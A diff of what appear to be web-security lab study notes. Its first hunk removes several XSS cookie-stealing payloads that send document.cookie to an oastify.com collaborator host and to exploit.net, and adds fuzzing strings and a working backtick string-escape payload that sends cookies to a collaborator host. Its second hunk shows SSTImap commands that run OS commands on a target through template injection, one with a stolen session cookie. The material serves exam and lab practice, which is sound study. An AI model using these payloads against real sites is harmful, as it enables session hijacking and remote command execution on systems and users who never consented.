@@ -346,15 +346,18 @@ location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location
 ```
 \'-alert(1)//  
 
-\'-document.location=\`https://prke1jwb2kj1o2okhwai71twenke86wv.oastify.com/?ticks=\`+document.cookie//
-\'-fetch(\'https://prke1jwb2kj1o2okhwai71twenke86wv.oastify.com/?ticks=\'+document.cookie)//
-\'-document.write(`<img src="https://exploit.net?cookieStealer='+document.cookie+'" />`);
-<script>
-document.write('<img src="https://exploit.net?cookieStealer='+document.cookie+'" />');
-</script>
+fuzzer\';console.log(12345);//  
+
+fuzzer\';alert(`Testing The backtick a typographical mark used mainly in computing`);//
+```
+
+>Using a single **backslash**, single quote and **semicolon** we escape out of the JavaScript string variable, then using backticks to enclose the ```document.location``` path, allow for the cookie stealer to bypass application protection.  
+
+```
+\';document.location=`https://COLLABORATOR.com/?BackTicks=`+document.cookie;//
 ```  
 
->^^ Failed to change above alert into cookie stealer payload that send session token to collaborator. sad face :-(  
+>With help from Trevor I made this into cookie stealer payload, using backticks. Thanks Trevor, here is his youtube time index = [TJCHacking XSS string escape](https://youtu.be/Aqfl2Rj0qlU?t=598)  
   
 ![fail-escape](images/fail-escape.png)  
   
@@ -1702,7 +1705,7 @@ stockApi=%2fproduct%2fnextProduct%3fcurrentProductId%3d1%26path%3dhttp%253a%2f%2
 python /opt/SSTImap/sstimap.py --engine erb -u https://TARGET.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock --os-cmd "cat /home/carlos/secret"
 ```  
 
->POST request data param to test and send payload using SSTImap.  
+>POST request with the data param to test and send payload using SSTImap tool.  
 
 ```bash
 python /opt/SSTImap/sstimap.py -u https://TARGET.net/product/template?productId=1 --cookie 'session=StolenUserCookie' --method POST --marker fuzzer --data 'csrf=ValidCSRFToken&template=fuzzer&template-action=preview' --engine Freemarker --os-cmd 'cat /home/carlos/secret'
